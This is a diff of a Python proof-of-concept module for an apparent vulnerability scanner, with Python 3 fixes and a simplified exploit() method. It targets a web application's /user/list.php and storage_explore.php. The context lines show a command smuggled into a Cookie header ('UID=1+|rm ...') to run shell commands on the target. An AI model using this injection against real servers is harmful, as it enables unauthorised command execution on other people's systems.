@@ -59,7 +59,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             def random_str(x): return ''.join(
-                random.sample(string.letters+string.digits, x))
+                random.sample(string.ascii_letters + string.digits, x))
             vul_url_get_path = '{target}/user/list.php'.format(
                 target=self.target)
             vul_url_get_shell = '{target}/user/storage_explore.php'.format(
@@ -78,7 +78,7 @@ class Poc(ABPoc):
                 urllib.request.urlopen(urllib.request.Request(
                     vul_url_get_shell, headers=headers)).read()
                 response = urllib.request.urlopen(
-                    '%s/user/%s.txt' % (url, file_name)).read()
+                    '%s/user/%s.txt' % (self.target, file_name)).read()
                 # remove verify txt
                 headers = {
                     'Cookie': 'USER=UID=1+|rm %s/%s.txt' % (path[0], file_name)}
@@ -91,18 +91,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip(
-            '/') + '/' + (self.get_option('base_path').lstrip('/'))
-        try:
-            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
-                target=self.target, vuln=self.vuln))
-
-            if res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的*********为{data}'.format(
-                    target=self.target, name=self.vuln.name, data=exploit_data))
-
-        except Exception as e:
-            self.output.info('执行异常{}'.format(e))
+        self.verify()
 
 
 if __name__ == '__main__':
